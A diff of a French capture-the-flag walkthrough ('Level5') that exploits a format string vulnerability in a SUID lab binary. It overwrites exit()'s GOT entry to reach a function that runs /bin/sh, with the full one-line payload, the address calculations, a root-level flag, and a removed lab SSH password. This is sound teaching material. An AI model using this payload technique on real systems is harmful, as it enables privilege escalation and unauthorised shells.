@@ -1,136 +1,120 @@
 # Level5 - Walkthrough
 
 ## Objectif
-Utiliser une format string vulnerability pour overwriter l'adresse de `exit()` dans la GOT (Global Offset Table) et faire exécuter la fonction `o()` à la place, qui lance `/bin/sh`.
+Exploiter une format string vulnerability pour écraser l'adresse de `exit()` dans la GOT et rediriger l'exécution vers `o()` qui lance `/bin/sh`.
+
+**Technique** : GOT Overwrite
 
 ---
 
-## Étape 1 : Connexion
+## Étapes d'exploitation
 
-```bash
-ssh level5@localhost -p 4242
-# Mot de passe : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-```
-
----
-
-## Étape 2 : Reconnaissance
-
+### 1. Reconnaissance
 ```bash
 ls -la
-./level5
-test
-# test
+# -rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
+# ⚠️ Bit SUID actif → s'exécute avec les droits de level6
+
+python -c "print('%x %x %x')" | ./level5
+# 200 b7fd1ac0 b7ff37d0
+# → Format string vulnerability confirmée
 ```
 
-Le programme lit une entrée via `fgets()` et l'affiche avec `printf()`.
-
----
-
-## Étape 3 : Identifier la vulnérabilité
-
-Analyser le binaire dans Ghidra :
+### 2. Analyse du code (Ghidra)
 
 ```c
-void n(void)
-{
-  char local_20c [520];
-  
-  fgets(local_20c, 0x200, stdin);
-  printf(local_20c);  // ← Format string vulnerability !
-  exit(1);
+void o(void) {
+    system("/bin/sh");
+    _exit(1);
 }
 
-void o(void)
-{
-  system("/bin/sh");
-  _exit(1);
+void n(void) {
+    char local_20c[520];
+    fgets(local_20c, 0x200, stdin);
+    printf(local_20c);  // ⚠️ Vulnérable !
+    exit(1);            // ← On va détourner cet appel
 }
 ```
 
-La vulnérabilité : `printf(local_20c)` utilise notre entrée comme format string.
+**Stratégie** : Écraser `GOT[exit]` avec l'adresse de `o()`.
+Quand `exit(1)` sera appelé → `o()` s'exécutera → `/bin/sh`.
 
-Stratégie : Overwriter l'adresse de `exit()` dans la GOT pour qu'elle pointe vers `o()` à la place.
+### 3. Trouver les adresses critiques
 
----
-
-## Étape 4 : Trouver les adresses critiques
-
-### Adresse de `o()`
-
-Dans Ghidra, hover sur `o()` → affiche l'adresse :
-
-```
-o() @ 0x080484a4
+#### Adresse de `o()`
+```bash
+# Dans Ghidra → cliquer sur o()
+# Adresse : 0x080484a4
 ```
 
-### Adresse de `exit()` dans la GOT
-
+#### Adresse de `exit()` dans la GOT
 ```bash
 objdump -R level5 | grep exit
+# 08049838 R_386_JUMP_SLOT   exit
+# Adresse GOT : 0x08049838
 ```
 
-Résultat :
-```
-08049838 R_386_JUMP_SLOT   exit
-```
-
-Adresse GOT : `0x08049838`
-
----
-
-## Étape 5 : Trouver la position du buffer sur la stack
+### 4. Trouver la position du buffer
 
 ```bash
-python -c 'print "AAAA" + " %x" * 10' | ./level5
+python -c "print('AAAA' + '%x.'*10)" | ./level5
+# ...41414141...
+# → "AAAA" = 0x41414141 en position 4
 ```
 
-Résultat :
+**Notre buffer commence en position 4.**
+
+### 5. Construction du payload
+
+**Conversion 0x080484a4 → décimal** :
 ```
-AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078
-```
-
-`41414141` (AAAA en hex) apparaît à la **4ème position** → le buffer est à position 4.
-
----
-
-## Étape 6 : Construction du payload
-
-Pour écrire `0x080484a4` (adresse de `o()`) à `0x08049838` (exit GOT) :
-
-1. Mettre l'adresse de exit GOT : `\x38\x98\x04\x08`
-2. Utiliser format string pour écrire :
-   - `%Xd` où X = nombre de caractères à imprimer
-   - `%4$n` pour écrire à la position 4 (notre buffer)
-
-Calcul :
-- `0x080484a4` en décimal = **134513824**
-- Caractères déjà affichés = 4 (l'adresse)
-- Donc : `%134513820d%4$n` (134513824 - 4 = 134513820)
-
-**MAIS** : Plus simple, on peut faire :
-
-```
-[adresse exit GOT] + [%134513824d%4$n]
+8×16^6 + 4×16^4 + 8×16^3 + 4×16^2 + 10×16^1 + 4×16^0
+= 134217728 + 262144 + 32768 + 1024 + 160 + 4
+= 134513828
 ```
 
-Quand printf s'exécute :
-1. Il affiche 4 bytes de l'adresse
-2. Puis affiche 134513824 caractères
-3. Puis écrit à position 4 (exit GOT) la valeur totale de caractères affichés = 0x080484a4
+**Calcul du padding** :
+```
+Valeur à écrire  = 134513828
+Adresse affichée = 4 octets
+Padding          = 134513828 - 4 = 134513824 → %134513824d
+```
 
----
+**Conversion de l'adresse GOT en little-endian** :
+```
+0x08049838 → \x38\x98\x04\x08
+```
 
-## Étape 7 : Exploitation
+**Structure du payload** :
+```
+[Adresse GOT exit] + [%134513824d] + [%4$n]
+       ↓                   ↓              ↓
+\x38\x98\x04\x08   134513824 chars  Écrit 134513828 en position 4
+                                    = adresse de o() dans GOT[exit]
+```
+
+### 6. Exploitation
 
 ```bash
-(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' ; cat) | ./level5
+(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat) | ./level5
 ```
 
-Résultat : Un shell `/bin/sh` s'ouvre.
+**Résultat** :
+```
+$
+```
+
+### 7. Vérification
+```bash
+$ whoami
+level6
+```
+
+### 8. Récupération du flag
 
 ```bash
-cat /home/user/level6/.pass
+$ cat /home/user/level6/.pass
+d3b7bf1025544a6d95147b7b5b3f36f31f333db3
 ```
 
 ---
@@ -140,3 +124,7 @@ cat /home/user/level6/.pass
 d3b7bf1025544a6d95147b7b5b3f36f31f333db3
 ```
 
+## Type de vulnérabilité
+- Format String Vulnerability (CWE-134)
+- GOT Overwrite
+- SUID privilege escalation (CWE-250)
